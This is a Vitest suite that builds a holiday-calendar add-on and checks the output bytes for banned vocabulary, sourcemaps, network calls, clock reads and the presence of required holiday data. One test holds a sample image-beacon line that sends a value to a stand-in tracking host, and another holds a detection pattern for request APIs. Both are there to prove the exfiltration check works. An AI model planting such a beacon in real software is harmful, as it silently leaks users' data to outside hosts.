/**
 * The release grep, run where the release runs it: over BUILT OUTPUT.
 *
 * Every other guard in this package reads sources. That is one inference away
 * from the thing that ships — a bundler keeps a comment, a constant is folded,
 * a string arrives from somewhere else — and the sweep (17 §2) does not read
 * sources at all. So this suite builds the add-on and greps the bytes, with the
 * FULL release list: `bannedSubstringsIn` plus the union of the per-locale
 * tiering words, which catch the spellings no ASCII fragment can see.
 *
 * IT IS NOT A FORMALITY HERE, AND IT CAUGHT SOMETHING. A Vite library build
 * does NOT strip comments that sit inside an expression, so five occurrences of
 * "product" and "promising" written inside `register()`'s object literal went
 * straight into `dist/client.js` while every source-level check was green. The
 * words were in prose ABOUT the add-on, in a file nobody would think to sweep,
 * and the release grep would have found them. They were reworded rather than
 * carved out, for the reason `testing/lexicon.ts` gives.
 *
 * It also closes the manifest's loop: `manifest.test.ts` proves the manifest
 * names the filename `vite.config.ts` says it writes, and this proves the build
 * actually wrote it, at the path the manifest declares, resolved the way an
 * installer resolves it (24 AC10: package-root-relative).
 */

import { existsSync, readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { beforeAll, describe, expect, it } from "vitest";

import manifest from "../manifest.json" with { type: "json" };
import { OUTPUT } from "../vite.config.ts";
import {
  foreignImportsIn,
  impuritiesIn,
  offendingAddresses,
  sendersIn,
} from "@adminium/add-on-host/testing";

import { buildForReal, DIST, ROOT } from "./testing/build.ts";
import { bannedHitsIn, tieringHitsIn } from "./testing/lexicon.ts";

beforeAll(() => {
  buildForReal();
}, 180_000);

function walk(dir: string): string[] {
  return readdirSync(dir).flatMap((entry) => {
    const full = join(dir, entry);
    return statSync(full).isDirectory() ? walk(full) : [full];
  });
}

/**
 * EVERY FILE IN `dist/`, with no extension filter of any kind.
 *
 * The published artefact is whatever is in this directory. A gate that decides
 * some of it does not count is a gate with a hole in the shape of whatever was
 * excluded — which is how a 258 KB verbatim copy of the sources once shipped
 * past this same check in a sibling package, as a sourcemap the walk skipped.
 */
const built = (): string[] => walk(DIST);
const relative = (file: string) => file.slice(DIST.length + 1);

/** Every path the manifest tells an installer to load, package-root-relative. */
const DECLARED_ENTRY_POINTS = manifest.addOn.slots.map((fill) => fill.client);

describe("the build writes what the manifest promises", () => {
  it("emits the one half, under the name the manifest uses", () => {
    for (const path of Object.values(OUTPUT)) {
      expect(existsSync(join(ROOT, path)), `${path} is missing from the build`).toBe(true);
    }
  });

  it("puts a real file at every entry point the manifest declares (AC10)", () => {
    // Driven from `manifest.json` rather than from `OUTPUT`, so this fails when
    // the manifest names something the build does not write — the failure mode
    // an installer hits at load time and nobody hits before.
    for (const path of DECLARED_ENTRY_POINTS) {
      expect(existsSync(join(ROOT, path)), `${path} is declared but not built`).toBe(true);
    }
  });

  it("ships nothing but that one module", () => {
    // No server half, no sourcemap, no stray asset: what the manifest names is
    // the whole of the artefact, which is what makes "grep all of `dist/`" a
    // complete gate rather than a sample of one.
    expect(built().map(relative).sort()).toEqual(["client.js"]);
  });

  it("emits no sourcemap, and no reference to one", () => {
    // `sourcesContent` is a verbatim copy of the sources, comments and all. The
    // published artefact is not a debugging session.
    expect(built().filter((file) => file.endsWith(".map")).map(relative)).toEqual([]);
    for (const file of built()) {
      expect(readFileSync(file, "utf8")).not.toContain("sourceMappingURL");
    }
  });

  it("leaves the bundle a single self-contained ESM file", () => {
    // D7. A second entry sharing a generated chunk would make the client import
    // a sibling the manifest does not name, and the host loads only what the
    // manifest names.
    const client = readFileSync(join(ROOT, OUTPUT.client), "utf8");
    const relativeImports = [...client.matchAll(/from\s*"(\.[^"]*)"/g)].map((match) => match[1]);
    expect(relativeImports).toEqual([]);
  });

  it("imports nothing but the runtime the host already has (D7)", () => {
    // React, and nothing else. An add-on that brought a date library would put
    // a second copy of somebody's tz database in a page — which is a large part
    // of why `civil.ts` is integer arithmetic written out by hand.
    const client = readFileSync(join(ROOT, OUTPUT.client), "utf8");
    const packages = [...client.matchAll(/from\s*"([^."][^"]*)"/g)].map((match) => match[1]!);
    for (const specifier of packages) {
      expect(/^react($|\/)/.test(specifier), `the bundle imports ${specifier}`).toBe(true);
    }
    expect(packages.length, "the bundle imports nothing at all — did it build?").toBeGreaterThan(0);
  });

  it("carries no test-only module, so the lexicon cannot ship", () => {
    // `testing/lexicon.ts` spells every banned word out. A bundle that reached
    // it would fail the grep below on the file that DEFINES the grep.
    const client = readFileSync(join(ROOT, OUTPUT.client), "utf8");
    expect(client).not.toContain("SUBSTRING_BANNED");
    expect(client).not.toContain("ALLOWED_TOKENS");
  });
});

describe("the data really is in the bundle, which is the whole product", () => {
  const client = () => readFileSync(join(ROOT, OUTPUT.client), "utf8");

  it("carries the day-set names, so nothing has to be fetched to see them", () => {
    // The claim on the shelf card is that the days are IN the add-on. These are
    // four of them, in four languages, and their presence in the bytes is what
    // makes that claim checkable rather than architectural.
    for (const name of ["Thanksgiving Day", "Tag der Deutschen Einheit", "Velký pátek", "Nytårsdag"]) {
      expect(client().includes(name), `${name} is not in the bundle`).toBe(true);
    }
  });

  it("carries the countries it refuses to guess, and their reasons", () => {
    // The refusal is part of the product, so it is part of the artefact. A
    // build that tree-shook it away would ship a picker that silently omitted
    // three countries, which is the false claim this add-on exists not to make.
    for (const key of [
      "addon.holiday-calendars.announced.cn",
      "addon.holiday-calendars.announced.tw",
      "addon.holiday-calendars.announced.eg",
    ]) {
      expect(client().includes(key), `${key} was shaken out of the bundle`).toBe(true);
    }
  });

  it("carries all eight locales", () => {
    for (const locale of ["en-US", "de-DE", "fr-FR", "cs-CZ", "da-DK", "zh-CN", "zh-TW", "ar-EG"]) {
      expect(client().includes(locale), `${locale} is not in the bundle`).toBe(true);
    }
  });
});

describe("the vocabulary ban, over built output", () => {
  it("has something to grep", () => {
    expect(built().length).toBeGreaterThan(0);
  });

  it("contains none of the banned substrings, case-insensitively", () => {
    const offenders: string[] = [];
    for (const file of built()) {
      const bytes = readFileSync(file, "utf8");
      for (const { word, at } of bannedHitsIn(bytes)) {
        offenders.push(
          `${relative(file)} · "${word}" · …${bytes.slice(Math.max(0, at - 70), at + 70)}…`,
        );
      }
    }
    expect(offenders, `\n${offenders.join("\n\n")}\n`).toEqual([]);
  });

  it("never calls this add-on premium or pro in any locale's own words", () => {
    // All eight bundles land in one built file, so the per-locale tables are
    // greped as one union here. This is what catches the spellings that contain
    // no banned ASCII fragment at all.
    const offenders: string[] = [];
    for (const file of built()) {
      const bytes = readFileSync(file, "utf8");
      for (const { pattern, at } of tieringHitsIn(bytes)) {
        offenders.push(
          `${relative(file)} · /${pattern}/ · …${bytes.slice(Math.max(0, at - 70), at + 70)}…`,
        );
      }
    }
    expect(offenders, `\n${offenders.join("\n\n")}\n`).toEqual([]);
  });
});

/**
 * D11 OVER THE ARTEFACT, WHICH IS WHERE A MUTANT ACTUALLY REACHES.
 *
 * A sibling package's "no real third-party call" was once a grep for four
 * spellings. A verifier put `new Image(); img.src = "https://…"` into one of its
 * components and every gate in three repositories stayed green, all the way
 * into a live host app's bundle. The sources are checked in `sources.test.ts`;
 * these are the bytes, which is the last place it can be caught and the only
 * place a folded constant or a surviving comment shows up.
 *
 * NO ADDRESS AT ALL is the right allow-list for this add-on. It declares no
 * `network` block and no `outbound-http` capability, so the first URL to appear
 * in these bytes is a finding whatever it points at — including one written in
 * a COMMENT, because this build keeps comments and a comment in `dist/` is a
 * byte in `dist/`.
 */
describe("nothing in the artefact can reach a host we do not control (24 D11)", () => {
  it("names no address at all, in any emitted file", () => {
    const offences = built().flatMap((file) =>
      offendingAddresses(readFileSync(file, "utf8"), []).map((url) => `${relative(file)} → ${url}`),
    );
    expect(offences).toEqual([]);
  });

  it("carries nothing that can issue a request", () => {
    const offences = built().flatMap((file) => [
      ...sendersIn(readFileSync(file, "utf8")).map((means) => `${relative(file)} → ${means}`),
      ...foreignImportsIn(readFileSync(file, "utf8")).map((spec) => `${relative(file)} → ${spec}`),
    ]);
    expect(offences).toEqual([]);
  });

  it("reads something, so an empty result is never a pass", () => {
    expect(built().length).toBeGreaterThan(0);
    expect(readFileSync(join(ROOT, OUTPUT.client), "utf8").length).toBeGreaterThan(10_000);
  });

  it("would report the mutant, which held none of the four words", () => {
    const mutant = 'const img=new Image();img.src="https://tracking.example-analytics.net/p?c="+c;';
    expect(offendingAddresses(mutant, [])).toEqual(["https://tracking.example-analytics.net/p?c="]);
    expect(sendersIn(mutant)).toEqual(["new Image — an image beacon"]);
    expect(/fetch\(|XMLHttpRequest|new WebSocket|navigator\.sendBeacon/.test(mutant)).toBe(false);
  });
});

/**
 * ── AND NO CLOCK IN THE BYTES EITHER ───────────────────────────────────────
 *
 * `sources.test.ts` runs `impuritiesIn` over the sources and this add-on has no
 * server half for anything to hide in, so the source check is close to
 * complete. What it cannot see is a constant the bundler folded or a helper it
 * inlined, and the whole of `civil.ts` exists so that no date in this package
 * depends on when or where it is read. A demo whose dates move is a demo nobody
 * can screenshot; a DAY-SET whose dates move is worse than that.
 */
describe("the artefact reads no clock", () => {
  it("calls Date only where a formatter is being handed one", () => {
    /*
     * THE SHARED RULE, POINTED AT THE BYTES. `impuritiesIn` is the same
     * function `sources.test.ts` runs over the sources — imported rather than
     * respelled, because a private regular expression here would be a second
     * rule and `shared-rule.test.ts` reports it as one. Four add-ons each wrote
     * their own version of this pattern and none of the four checked
     * `crypto.getRandomValues`.
     */
    const client = readFileSync(join(ROOT, OUTPUT.client), "utf8");
    expect(impuritiesIn(client)).toEqual([]);
    // The one construction that IS allowed, and it must still be there — a
    // bundle with no `Date.UTC` at all would mean the formatting seam had gone
    // and every date on the screen had started depending on where it was read.
    expect(client).toContain("Date.UTC(");
  });
});
